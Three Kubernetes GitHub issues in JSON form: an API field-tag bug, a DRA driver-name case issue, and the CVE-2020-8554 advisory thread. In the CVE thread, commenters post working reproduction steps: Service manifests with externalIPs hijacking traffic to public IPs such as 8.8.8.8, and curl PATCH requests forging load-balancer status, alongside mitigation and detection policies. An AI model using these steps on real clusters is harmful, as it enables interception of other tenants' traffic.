{"repo": "kubernetes/kubernetes", "issue_number": 134282, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134282", "issue_title": "ResourceClaim field Effect currently marked +optional but should be +required", "issue_author": "aaron-prindle", "issue_body": "### What happened?\n\nRelated comment: https://github.com/kubernetes/kubernetes/pull/134276#discussion_r2379910306\n\n```go\n// +optional\nEffect DeviceTaintEffect json:\"effect,omitempty\" protobuf:\"bytes,4,opt,name=effect,casttype=DeviceTaintEffect\"\n```\n\nThe above tag is marked +optional incorrectly, validation checks that a field is supplied by the client and there is no default (it should be +required, not +optional w/ hand-written defaulting as there is no such defaulting and it is required):\n\n[kubernetes/pkg/apis/resource/validation/validation.go](https://github.com/kubernetes/kubernetes/blob/243d8c000e451da6f0e8f80704db5d5f672d3d18/pkg/apis/resource/validation/validation.go#L1346-L1349)\n\nLines 1346 to 1349 in [243d8c0](https://github.com/kubernetes/kubernetes/commit/243d8c000e451da6f0e8f80704db5d5f672d3d18)\n```go\n case taint.Effect == \"\": \n \tallErrs = append(allErrs, field.Required(fldPath.Child(\"effect\"), \"\")) // Required in a taint. \n case !validDeviceTaintEffects.Has(taint.Effect): \n \tallErrs = append(allErrs, field.NotSupported(fldPath.Child(\"effect\"), taint.Effect, sets.List(validDeviceTaintEffects)))\n```\n\n\n\n### What did you expect to happen?\n\nI expected the field to be marked +required\n", "issue_labels": ["kind/bug", "sig/api-machinery", "triage/accepted"], "comments": [{"author": "aaron-prindle", "body": "/sig apimachinery\n/triage accepted"}, {"author": "k8s-ci-robot", "body": "@aaron-prindle: The label(s) `sig/apimachinery` cannot be applied, because the repository doesn't have them.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/134282#issuecomment-3335401039):\n\n>/sig apimachinery\n>/triage accepted\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "aaron-prindle", "body": "/sig api-machinery"}, {"author": "pohly", "body": "Agreed. This might have been copy-and-pasted from `DeviceToleration`: there the effect is optional."}]}
{"repo": "kubernetes/kubernetes", "issue_number": 97076, "issue_url": "https://github.com/kubernetes/kubernetes/issues/97076", "issue_title": "CVE-2020-8554: Man in the middle using LoadBalancer or ExternalIPs", "issue_author": "tallclair", "issue_body": "CVSS Rating: **Medium** ([CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L))\r\n \r\nThis issue affects multitenant clusters. If a potential attacker can already create or edit services and pods, then they may be able to intercept traffic from other pods (or nodes) in the cluster.\r\n \r\nAn attacker that is able to create a ClusterIP service and set the spec.externalIPs field can intercept traffic to that IP. An attacker that is able to patch the status (which is considered a privileged operation and should not typically be granted to users) of a LoadBalancer service can set the status.loadBalancer.ingress.ip to similar effect.\r\nThis issue is a design flaw that cannot be mitigated without user-facing changes.\r\n### Affected Components and Configurations\r\n\r\nAll Kubernetes versions are affected. Multi-tenant clusters that grant tenants the ability to create and update services and pods are most vulnerable.\r\n### Mitigations\r\n\r\nThere is no patch for this issue, and it can currently only be mitigated by restricting access to the vulnerable features. Because an in-tree fix would require a breaking change, we will open a conversation about a longer-term fix or built-in mitigation after the embargo is lifted\r\n\r\nTo restrict the use of external IPs we are providing an admission webhook container: k8s.gcr.io/multitenancy/externalip-webhook:v1.0.0. The source code and deployment instructions are published at https://github.com/kubernetes-sigs/externalip-webhook.\r\n\r\nAlternatively, external IPs can be restricted using [OPA Gatekeeper](https://github.com/open-policy-agent/gatekeeper). A sample ConstraintTemplate and Constraint can be found here: https://github.com/open-policy-agent/gatekeeper-library/tree/master/library/general/externalip.\r\n\r\nNo mitigations are provided for LoadBalancer IPs since we do not recommend granting users *patch service/status* permission. If LoadBalancer IP restrictions are required, the approach for the external IP mitigations can be copied.\r\n### Detection\r\n\r\nExternalIP services are not widely used, so we recommend manually auditing any external IP usage. Users should not patch service status, so audit events for patch service status requests authenticated to a user may be suspicious.\r\n \r\nIf you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io\r\n#### Acknowledgements\r\n\r\nThis vulnerability was reported by Etienne Champetier (@champtar) of Anevia.\r\n \r\n/area security\r\n/kind bug\r\n/committee product-security\r\n/sig network\r\n", "issue_labels": ["kind/bug", "sig/network", "area/security", "committee/security-response", "official-cve-feed"], "comments": [{"author": "k8s-ci-robot", "body": "@tallclair: There are no sig labels on this issue. Please add an appropriate label by using one of the following commands:\n- `/sig <group-name>`\n- `/wg <group-name>`\n- `/committee <group-name>`\n\nPlease see the [group list](https://git.k8s.io/community/sig-list.md) for a listing of the SIGs, working groups, and committees available.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@tallclair: This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "jcrowthe", "body": "This ticket is sparse on details. May either more detail or a POC be provided?"}, {"author": "dharmab", "body": "I'm particularly confused by this line:\r\n\r\n> An attacker that is able to create a ClusterIP service and set the spec.externalIPs field can intercept traffic to that IP.\r\n\r\nIs traffic intercepted if the client is using the service discovery name or another DNS name that resolves to the targeted IP? Or is this only intercepted if the client uses the IP address without DNS?"}, {"author": "tallclair", "body": "If you create a service with an arbitrary external IP, then traffic to that external IP from within the cluster will be routed to that service. This lets an attacker that has permission to create a service with an external IP to intercept traffic to any target IP.\r\n\r\nThe routing happens at the IP layer, so I don't think it matters if they use DNS or not (once DNS resolves to the target IP, I think it will still be intercepted)."}, {"author": "dharmab", "body": "Ah, I see. So I could create a Service like this to intercept some or all UDP traffic from Pods in the cluster to Google DNS:\r\n\r\n```yaml\r\napiVersion: v1\r\nkind: Service\r\nmetadata:\r\n  name: my-evil-service\r\n  namespace: my-evil-namespace\r\nspec:\r\n  selector:\r\n    app: my-evil-dns-server\r\n  ports:\r\n    - name: dns\r\n      protocol: UDP\r\n      port: 53\r\n      targetPort: 9053\r\n  externalIPs:\r\n    - 8.8.8.8\r\n    - 8.8.4.4\r\n```"}, {"author": "tallclair", "body": "I'm closing this issue, since https://github.com/kubernetes/kubernetes/issues/97110 captures the follow up items."}, {"author": "champtar", "body": "I'll try to finish my write up tonight, but when I did all my tests `externalIPs` were not working in some cases where `LoadBalancer` was working.\r\nEDIT: Here the write up: https://blog.champtar.fr/K8S_MITM_LoadBalancer_ExternalIPs/"}, {"author": "danquack", "body": "For those looking to reproduce from the above ^\r\n```\r\n~ kubectl run nginx --image nginx:latest --port 80\r\n~ cat <<EOF | kubectl apply -f -\r\napiVersion: v1\r\nkind: Service\r\nmetadata:\r\n  name: my-evil-service\r\nspec:\r\n  selector:\r\n    run: nginx\r\n  type: LoadBalancer\r\n  ports:\r\n    - name: http\r\n      protocol: TCP\r\n      port: 80\r\n      targetPort: 80\r\n  externalIPs:\r\n    - 23.185.0.3 #cncf.io\r\nEOF\r\n~ kubectl get service\r\nNAME              TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)   AGE\r\nkubernetes        ClusterIP      10.96.0.1      <none>        443/TCP        25d\r\nmy-evil-service   LoadBalancer   10.97.145.71   23.185.0.3    80:30904/TCP   47m\r\n~  kubectl run --rm -i --tty curl --image=curlimages/curl --restart=Never -- curl -I http://cncf.io\r\nHTTP/1.1 200 OK\r\nServer: nginx/1.19.5\r\nDate: Tue, 08 Dec 2020 02:22:21 GMT\r\nContent-Type: text/html\r\nContent-Length: 612\r\nLast-Modified: Tue, 24 Nov 2020 13:02:03 GMT\r\nConnection: keep-alive\r\nETag: \"5fbd044b-264\"\r\nAccept-Ranges: bytes\r\n...\r\n~  kubectl run --rm -i --tty curl --image=curlimages/curl --restart=Never -- curl -I http://23.185.0.3\r\nHTTP/1.1 200 OK\r\nServer: nginx/1.19.5\r\nDate: Tue, 08 Dec 2020 02:17:52 GMT\r\nContent-Type: text/html\r\nContent-Length: 612\r\nLast-Modified: Tue, 24 Nov 2020 13:02:03 GMT\r\nConnection: keep-alive\r\nETag: \"5fbd044b-264\"\r\nAccept-Ranges: bytes\r\n...\r\n```"}, {"author": "champtar", "body": "@maplain just edited my message, with my write-up link, you will find in it how to patch the status easily\r\n@danquack you are using `type: LoadBalancer` and `externalIPs`, never tried that, does it change anything compared to `type: ClusterIP`"}, {"author": "maplain", "body": ">you are using type: LoadBalancer and externalIPs, never tried that, does it change anything compared to type: ClusterIP\r\n\r\nI actually tried to set `externalIP` and `loadBalancerIP` both using `type: loadBalancer`. As a result, I'm able to intercept traffic destined for both.\r\n(I used Google's IP in externalIPs and one VIP for another application in loadBalancerIP)\r\n\r\nkube-proxy has similar parallel logic to handle them: https://github.com/kubernetes/kubernetes/blob/master/pkg/proxy/iptables/proxier.go#L1088 and https://github.com/kubernetes/kubernetes/blob/master/pkg/proxy/iptables/proxier.go#L1164 so the finding is aligned"}, {"author": "danquack", "body": "@champtar `ClusterIP` seemed to do the same result. In my local environment, external IP hangs in pending, so that's why I went with externalIPs over loadBalancerIP\r\n```\r\n~ cat <<EOF | kubectl apply -f -\r\napiVersion: v1\r\nkind: Service\r\nmetadata:\r\n  name: my-evil-service\r\nspec:\r\n  selector:\r\n    run: nginx\r\n  type: ClusterIP\r\n  ports:\r\n    - name: http\r\n      protocol: TCP\r\n      port: 80\r\n      targetPort: 80\r\n  externalIPs:\r\n    - 23.185.0.3 #cncf.io\r\nEOF\r\n ~ kubectl run --rm -i --tty curl --image=curlimages/curl --restart=Never -- curl -I http://cncf.io\r\nHTTP/1.1 200 OK\r\nServer: nginx/1.19.5\r\n```"}, {"author": "champtar", "body": "@maplain what LoadBalancer are you using ? if just setting `loadBalancerIP` make the LB patch the status with this IP this is a problem"}, {"author": "borgerli", "body": "Thanks. But I could not reproduce the problem in my minikube 1.19 cluster following the steps. Here is what I got:\r\n```\r\nubuntu@server:~$ kubectl get svc \r\nNAME              TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)   AGE\r\nkubernetes        ClusterIP   10.96.0.1       <none>        443/TCP   4m55s\r\nmy-evil-service   ClusterIP   10.107.202.84   23.185.0.3    80/TCP    3m45s\r\nubuntu@server:~$ kubectl get ep\r\nNAME              ENDPOINTS           AGE\r\nkubernetes        192.168.49.2:8443   5m\r\nmy-evil-service   172.17.0.3:80       3m50s\r\nubuntu@server:~$ kubectl get po -o wide\r\nNAME    READY   STATUS    RESTARTS   AGE   IP           NODE       NOMINATED NODE   READINESS GATES\r\nnginx   1/1     Running   0          4m    172.17.0.3   minikube   <none>           <none>\r\nubuntu@server:~$ kubectl run --rm -i --tty curl --image=curlimages/curl --restart=Never -- curl -I http://23.185.0.3\r\nHTTP/1.1 404 Unknown site\r\nRetry-After: 0\r\nServer: Pantheon\r\nX-pantheon-fun-reason: The gods are wise, but do not know of the site which you seek.\r\nX-pantheon-fun-extended: Please double-check that you are using the correct url. If so, make sure it matches your dashboard's custom domain settings, and try again in 2 minutes.\r\nCache-Control: no-cache, must-revalidate\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: 4040\r\nDate: Tue, 08 Dec 2020 11:40:16 GMT\r\nConnection: keep-alive\r\nX-Served-By: cache-mdw17334-MDW, cache-hkg17923-HKG\r\nX-Cache: MISS, MISS\r\nX-Cache-Hits: 0, 0\r\nX-Timer: S1607427617.727297,VS0,VE172\r\nVary: Cookie, Cookie\r\nAge: 0\r\nAccept-Ranges: bytes\r\nVia: 1.1 varnish, 1.1 varnish\r\n\r\npod \"curl\" deleted\r\n\r\n```"}, {"author": "champtar", "body": "@borgerli ExternalIP MITM doesn't work 100% depending on you kubespray mode / CNI, see more results in my writeup (link in previous message)"}, {"author": "omoolchandani", "body": "We have written policy in terrascan to detect such configurations that can enable this CVE. Community can use the tool with opa and rego policy. \r\nhttps://github.com/accurics/terrascan/tree/master/pkg/policies/opa/rego/k8s/kubernetes_service/cve_2020_8554"}, {"author": "champtar", "body": "For everyone writing policies, externalIPs are working for `ClusterIP`, `NodePort` and `LoadBalancer` type\r\n```\r\n# kubectl get svc\r\nNAME          TYPE           CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGE\r\nmitm-eip-ci   ClusterIP      100.64.46.13    1.1.1.4       80/TCP         11m\r\nmitm-eip-lb   LoadBalancer   100.64.33.177   1.1.1.2       80:32461/TCP   11m\r\nmitm-eip-np   NodePort       100.64.32.216   1.1.1.3       80:30818/TCP   11m\r\n# ip a | grep 1.1.1\r\n    inet 1.1.1.2/32 brd 1.1.1.2 scope global kube-ipvs0\r\n    inet 1.1.1.3/32 brd 1.1.1.3 scope global kube-ipvs0\r\n    inet 1.1.1.4/32 brd 1.1.1.4 scope global kube-ipvs0\r\n```"}, {"author": "yuvalavra", "body": "> No mitigations are provided for LoadBalancer IPs since we do not recommend granting users patch service/status permission. If LoadBalancer IP restrictions are required, the approach for the external IP mitigations can be copied.\r\n\r\nWhile this may not be a route for privilege escalation within a cluster, it may be a way for an attacker to persist or harvest credentials without triggering alerts. I've been thinking about auditing/alerting on patches to the status of Load Balancer services. Do system components perform that action regularly? Will auditing it generate a lot of false positives? "}, {"author": "AbirHamzi", "body": "Hello everyone, I'm trying to reproduce the CVE but I can't patch the service status. I'm following this example https://blog.champtar.fr/K8S_MITM_LoadBalancer_ExternalIPs/ . I have tried this on AKS cluster and minikube with k8s v1.18 and I always get the same thing, the patch succeeded but the LoadBalancer IP is still the same.\r\n\r\nBefore Patch:\r\n```\r\nNAME      TYPE           CLUSTER-IP    EXTERNAL-IP     PORT(S)                      AGE\r\nmitm-lb   LoadBalancer   10.97.131.4   192.168.1.240   80:31824/TCP,443:30575/TCP   39m\r\n```\r\nPatch command:\r\n\r\n```\r\ncurl -k -v -XPATCH  -H \"Accept: application/json\" -H \"Content-Type: application/merge-patch+json\" 'http://127.0.0.1:8001/api/v1/namespaces/kubeproxy-mitm/services/mitm-lb/status' -d '{\"status\":{\"loadBalancer\":{\"ingress\":[{\"ip\": \"192.168.1.241\"}]}}}'\r\n```\r\nResult:\r\n\r\n```\r\n* Expire in 0 ms for 6 (transfer 0x560712956f50)\r\n*   Trying 127.0.0.1...\r\n* TCP_NODELAY set\r\n* Expire in 200 ms for 4 (transfer 0x560712956f50)\r\n* Connected to 127.0.0.1 (127.0.0.1) port 8001 (#0)\r\n> PATCH /api/v1/namespaces/kubeproxy-mitm/services/mitm-lb/status HTTP/1.1\r\n> Host: 127.0.0.1:8001\r\n> User-Agent: curl/7.64.0\r\n> Accept: application/json\r\n> Content-Type: application/merge-patch+json\r\n> Content-Length: 64\r\n> \r\n* upload completely sent off: 64 out of 64 bytes\r\n< HTTP/1.1 200 OK\r\n< Content-Length: 1652\r\n< Content-Type: application/json\r\n< Date: Fri, 01 Jan 2021 17:10:37 GMT\r\n< \r\n{\r\n  \"kind\": \"Service\",\r\n  \"apiVersion\": \"v1\",\r\n  \"metadata\": {\r\n    \"name\": \"mitm-lb\",\r\n    \"namespace\": \"kubeproxy-mitm\",\r\n    \"selfLink\": \"/api/v1/namespaces/kubeproxy-mitm/services/mitm-lb/status\",\r\n    \"uid\": \"d3b8f37e-de4a-471f-b85b-a0df6941d15f\",\r\n    \"resourceVersion\": \"4836\",\r\n    \"creationTimestamp\": \"2021-01-01T16:29:42Z\",\r\n    \"annotations\": {\r\n      \"kubectl.kubernetes.io/last-applied-configuration\": \"{\\\"apiVersion\\\":\\\"v1\\\",\\\"kind\\\":\\\"Service\\\",\\\"metadata\\\":{\\\"annotations\\\":{},\\\"name\\\":\\\"mitm-lb\\\",\\\"namespace\\\":\\\"kubeproxy-mitm\\\"},\\\"spec\\\":{\\\"ports\\\":[{\\\"name\\\":\\\"http\\\",\\\"port\\\":80,\\\"targetPort\\\":8080},{\\\"name\\\":\\\"https\\\",\\\"port\\\":443,\\\"targetPort\\\":8443}],\\\"selector\\\":{\\\"app\\\":\\\"echoserver\\\"},\\\"type\\\":\\\"LoadBalancer\\\"}}\\n\"\r\n    },\r\n    \"managedFields\": [\r\n      {\r\n        \"manager\": \"curl\",\r\n        \"operation\": \"Update\",\r\n        \"apiVersion\": \"v1\",\r\n        \"time\": \"2021-01-01T17:10:37Z\",\r\n        \"fieldsType\": \"FieldsV1\",\r\n        \"fieldsV1\": {\"f:status\":{\"f:loadBalancer\":{\"f:ingress\":{}}}}\r\n      }\r\n    ]\r\n  },\r\n  \"spec\": {\r\n    \"ports\": [\r\n      {\r\n        \"name\": \"http\",\r\n        \"protocol\": \"TCP\",\r\n        \"port\": 80,\r\n        \"targetPort\": 8080,\r\n        \"nodePort\": 31824\r\n      },\r\n      {\r\n        \"name\": \"https\",\r\n        \"protocol\": \"TCP\",\r\n        \"port\": 443,\r\n        \"targetPort\": 8443,\r\n        \"nodePort\": 30575\r\n      }\r\n    ],\r\n    \"selector\": {\r\n      \"app\": \"echoserver\"\r\n    },\r\n    \"clusterIP\": \"10.97.131.4\",\r\n    \"type\": \"LoadBalancer\",\r\n    \"sessionAffinity\": \"None\",\r\n    \"externalTrafficPolicy\": \"Cluster\"\r\n  },\r\n  \"status\": {\r\n    \"loadBalancer\": {\r\n      \"ingress\": [\r\n        {\r\n          \"ip\": \"192.168.1.241\"\r\n        }\r\n      ]\r\n    }\r\n  }\r\n* Connection #0 to host 127.0.0.1 left intact\r\n}%                                           \r\n```\r\n\r\nAfter Patch:\r\n\r\n```\r\nNAME      TYPE           CLUSTER-IP    EXTERNAL-IP     PORT(S)                      AGE\r\nmitm-lb   LoadBalancer   10.97.131.4   192.168.1.240   80:31824/TCP,443:30575/TCP   41m\r\n```"}, {"author": "champtar", "body": "@AbirHamzi best guess is that the LoadBalancer controller patch back the service object right away\r\nTry to watch with `kubectl get svc mitm-lb -n kubeproxy-mitm -w -o yaml`\r\nAlso try to set `loadBalancerIP` to `192.168.1.241`"}, {"author": "yuvalavra", "body": "@AbirHamzi I'm not sure `kubectl get service` shows all load balancer IPs under EXTERNAL-IP, try running `kubectl get service -o json` and see whether your service status contains the IP you've sent in the patch message. The command below can be used to return all services with load balancer IPs.\r\n\r\n```bash\r\nkubectl get services --all-namespaces -o=jsonpath='{\"NAMESPACE\\tNAME\\tLOAD BALANCER IPs\\n\"}{range .items[?(.status.loadBalancer.ingress[*].ip)]}{.metadata.namespace}{\"\\t\"}{.metadata.name}{\"\\t[\"}{range .status.loadBalancer.ingress[*]}{\"\\\"\"}{.ip}{\"\\\",\"}{end}{\"]\\n\"}{end}' | sed 's/\\(.*\\),/\\1/' | column -t -s \"$(printf '\\t')\"\r\n```"}, {"author": "AbirHamzi", "body": "> @AbirHamzi best guess is that the LoadBalancer controller patch back the service object right away\r\n> Try to watch with `kubectl get svc mitm-lb -n kubeproxy-mitm -w -o yaml`\r\n> Also try to set `loadbalancerIP` to `192.168.1.241`\r\n\r\nI did what you said (watch the service during patch + set loadbalancerIP ) . Nothing is changed in the service (there's no controller i guess ) and the patch is succeeded.\r\n\r\n```\r\n curl -k -v -XPATCH  -H \"Accept: application/json\" -H \"Content-Type: application/merge-patch+json\" 'http://127.0.0.1:8001/api/v1/namespaces/kubeproxy-mitm/services/mitm-lb/status' -d '{\"status\":{\"loadBalancer\":{\"ingress\":[{\"ip\": \"192.168.1.241\"}]}}}'\r\n\r\n```\r\n\r\n```\r\n* Expire in 0 ms for 6 (transfer 0x55593eae5f50)\r\n*   Trying 127.0.0.1...\r\n* TCP_NODELAY set\r\n* Expire in 200 ms for 4 (transfer 0x55593eae5f50)\r\n* Connected to 127.0.0.1 (127.0.0.1) port 8001 (#0)\r\n> PATCH /api/v1/namespaces/kubeproxy-mitm/services/mitm-lb/status HTTP/1.1\r\n> Host: 127.0.0.1:8001\r\n> User-Agent: curl/7.64.0\r\n> Accept: application/json\r\n> Content-Type: application/merge-patch+json\r\n> Content-Length: 65\r\n> \r\n* upload completely sent off: 65 out of 65 bytes\r\n< HTTP/1.1 200 OK\r\n< Content-Length: 1731\r\n< Content-Type: application/json\r\n< Date: Fri, 01 Jan 2021 21:06:34 GMT\r\n< \r\n{\r\n  \"kind\": \"Service\",\r\n  \"apiVersion\": \"v1\",\r\n  \"metadata\": {\r\n    \"name\": \"mitm-lb\",\r\n    \"namespace\": \"kubeproxy-mitm\",\r\n    \"selfLink\": \"/api/v1/namespaces/kubeproxy-mitm/services/mitm-lb/status\",\r\n    \"uid\": \"34afcb36-26f3-4d6d-ae72-e515bf7ee0a2\",\r\n    \"resourceVersion\": \"1109\",\r\n    \"creationTimestamp\": \"2021-01-01T21:04:24Z\",\r\n    \"annotations\": {\r\n      \"kubectl.kubernetes.io/last-applied-configuration\": \"{\\\"apiVersion\\\":\\\"v1\\\",\\\"kind\\\":\\\"Service\\\",\\\"metadata\\\":{\\\"annotations\\\":{},\\\"name\\\":\\\"mitm-lb\\\",\\\"namespace\\\":\\\"kubeproxy-mitm\\\"},\\\"spec\\\":{\\\"loadBalancerIP\\\":\\\"192.168.1.240\\\",\\\"ports\\\":[{\\\"name\\\":\\\"http\\\",\\\"port\\\":80,\\\"targetPort\\\":8080},{\\\"name\\\":\\\"https\\\",\\\"port\\\":443,\\\"targetPort\\\":8443}],\\\"selector\\\":{\\\"app\\\":\\\"echoserver\\\"},\\\"type\\\":\\\"LoadBalancer\\\"}}\\n\"\r\n    },\r\n    \"managedFields\": [\r\n      {\r\n        \"manager\": \"curl\",\r\n        \"operation\": \"Update\",\r\n        \"apiVersion\": \"v1\",\r\n        \"time\": \"2021-01-01T21:06:34Z\",\r\n        \"fieldsType\": \"FieldsV1\",\r\n        \"fieldsV1\": {\"f:status\":{\"f:loadBalancer\":{\"f:ingress\":{}}}}\r\n      }\r\n    ]\r\n  },\r\n  \"spec\": {\r\n    \"ports\": [\r\n      {\r\n        \"name\": \"http\",\r\n        \"protocol\": \"TCP\",\r\n        \"port\": 80,\r\n        \"targetPort\": 8080,\r\n        \"nodePort\": 31240\r\n      },\r\n      {\r\n        \"name\": \"https\",\r\n        \"protocol\": \"TCP\",\r\n        \"port\": 443,\r\n        \"targetPort\": 8443,\r\n        \"nodePort\": 31532\r\n      }\r\n    ],\r\n    \"selector\": {\r\n      \"app\": \"echoserver\"\r\n    },\r\n    \"clusterIP\": \"10.107.71.110\",\r\n    \"type\": \"LoadBalancer\",\r\n    \"sessionAffinity\": \"None\",\r\n    \"loadBalancerIP\": \"192.168.1.240\",\r\n    \"externalTrafficPolicy\": \"Cluster\"\r\n  },\r\n  \"status\": {\r\n    \"loadBalancer\": {\r\n      \"ingress\": [\r\n        {\r\n          \"ip\": \"192.168.1.241\"\r\n        }\r\n      ]\r\n    }\r\n  }\r\n* Connection #0 to host 127.0.0.1 left intact\r\n}%  \r\n```\r\n\r\nThe following is the service and I have created it the first time with \"kubectl apply\" : \r\n\r\n```\r\napiVersion: v1\r\nkind: Service\r\nmetadata:\r\n  name: mitm-lb\r\n  namespace: kubeproxy-mitm\r\nspec:\r\n  ports:\r\n  - name: http\r\n    port: 80\r\n    targetPort: 8080\r\n  - name: https\r\n    port: 443\r\n    targetPort: 8443\r\n  selector:\r\n    app: echoserver\r\n  type: LoadBalancer\r\n  loadBalancerIP: 192.168.1.240\r\n```"}, {"author": "AbirHamzi", "body": "> @AbirHamzi I'm not sure `kubectl get service` shows all load balancer IPs under EXTERNAL-IP, try running `kubectl get service -o json` and see whether your service status contains the IP you've sent in the patch message. The command below can be used to return all services with load balancer IPs.\r\n> \r\n> ```shell\r\n> kubectl get services --all-namespaces -o=jsonpath='{\"NAMESPACE\\tNAME\\tLOAD BALANCER IPs\\n\"}{range .items[?(.status.loadBalancer.ingress[*].ip)]}{.metadata.namespace}{\"\\t\"}{.metadata.name}{\"\\t[\"}{range .status.loadBalancer.ingress[*]}{\"\\\"\"}{.ip}{\"\\\",\"}{end}{\"]\\n\"}{end}' | sed 's/\\(.*\\),/\\1/' | column -t -s \"$(printf '\\t')\"\r\n> ```\r\n\r\nAlways the old loadbalancerIP .\r\n\r\n```\r\nNAMESPACE       NAME     LOAD BALANCER IPs\r\nkubeproxy-mitm  mitm-lb  [\"192.168.1.240\"]\r\n```"}, {"author": "champtar", "body": "Just tested on AKS 1.18.10, before patching EXTERNAL-IP is pending, and I was able to patch 1.1.1.1 then 1.1.1.2"}, {"author": "AbirHamzi", "body": "> Just tested on AKS 1.18.10, before patching EXTERNAL-IP is pending, and I was able to patch 1.1.1.1 then 1.1.1.2\r\n\r\nYes I can patch the externalIP since its path is `/spec/externalIP`. Can you please confirm that you can patch this path `/status/loadbalancerIP/ingress/0/ip`"}, {"author": "champtar", "body": "By EXTERNAL-IP I mean the output of kubectl get svc, but I'm not touching externalIPs here.\r\nI just copy pasted the commands from my blog, and it still works for me."}, {"author": "AbirHamzi", "body": "> By EXTERNAL-IP I mean the output of kubectl get svc, but I'm not touching externalIPs here.\r\n> I just copy pasted the commands from my blog, and it still works for me.\r\n\r\nYes thank you very much now I'm able to patch the loadbalancerIP I can see it changing in real time with `--watch`. I have no idea what was the problem."}, {"author": "AbirHamzi", "body": "@champtar I'm working on a gatekeeper policy to block attempts to exploit CVE-2020-8554. Can you please give me your feedback https://github.com/open-policy-agent/gatekeeper-library/pull/45"}, {"author": "agilgur5", "body": "@champtar so in [your write-up](https://blog.champtar.fr/K8S_MITM_LoadBalancer_ExternalIPs/) you mention `Endpoints` as well -- should `Endpoints` IPs also be check via policy? If so, it seems like there's potentially a number of other resources that aren't covered by existing sample policies (including `loadBalancerIP` as linked in above Gatekeeper PR)"}, {"author": "champtar", "body": "You should not give permission to your users / applications to create `Endpoints` as they are created automatically.\r\nIf you can create `Endpoints` you might be able to steal some or all of the traffic yes, or maybe k8s will update it right away (need to check).\r\n\r\nNow in 3a / 3b what I was doing is setting the EIP or LBIP to the IP of a victim pod, pod exposed behind a clusterIP, that's why I name it endpoint at some point\r\n- try to talk to the pod via the clusterIP service, see if traffic is intercepted (pod/node -> clusterIP)\r\n- try to talk to the pod directly, see if traffic is intercepted (pod/node -> endpoint)"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 134131, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134131", "issue_title": "DRA API: driver names may have upper-case characters but is not caseless", "issue_author": "pohly", "issue_body": "### What would you like to be added?\n\nOriginally discussed in https://github.com/kubernetes/kubernetes/pull/134094#issuecomment-3304401401\n\nThe API validation allows driver names with upper (\"FOO.COM\") or even mixed case (\"Foo.com\"). However, conceptually \"FOO.COM\" and \"Foo.com\" are different drivers because all string comparisons compare the strings literally.\n\nWe should:\n- Document the driver name fields as \"this allows upper-case names but is not caseless - it treats upper-case and lower-case as different values\". This applies to the fields and the CEL expression documentation.\n- Warn about driver names with upper characters. We can do this for fields, but not for CEL expressions (or not easily there).\n\n/wg device-management\n/priority backlog\n\n\n### Why is this needed?\n\nLess surprises for users. Driver names should always be lower case.", "issue_labels": ["priority/backlog", "kind/feature", "help wanted", "needs-triage", "wg/device-management"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "pohly", "body": "/help\n"}, {"author": "k8s-ci-robot", "body": "@pohly: \n\tThis request has been marked as needing help from a contributor.\n\n### Guidelines\nPlease ensure that the issue body includes answers to the following questions:\n- Why are we solving this issue?\n- To address this issue, are there any code changes? If there are code changes, what needs to be done in the code and what places can the assignee treat as reference points?\n- How can the assignee reach out to you for help?\n\n\nFor more details on the requirements of such an issue, please see [here](https://www.kubernetes.dev/docs/guide/help-wanted/) and ensure that they are met.\n\nIf this request no longer meets these requirements, the label can be removed\nby commenting with the `/remove-help` command.\n\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/134131):\n\n>/help\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "lmktfy", "body": "We can \u00b7 and I hope will \u2013 **recommend** a ValidatingAdmissionPolicy to enforce use lowercase."}, {"author": "DanBokete", "body": "Hi, I\u2019m interested in contributing to this issue.\nI see that the original discussion suggests:\nDocumenting that driver names may include uppercase but are not caseless.\nWarning users if driver names contain uppercase letters.\nI have already updated the documentation in a PR, but I\u2019d like guidance on the warning for uppercase driver names:\nWhat\u2019s the preferred way to surface such a warning in Kubernetes validation functions?\nShould it be a field.Error, a log, or something else?\nI want to implement this correctly and would appreciate advice on the best approach."}, {"author": "pohly", "body": "Let's do one PR for all of the changes.\n\nFor warnings, 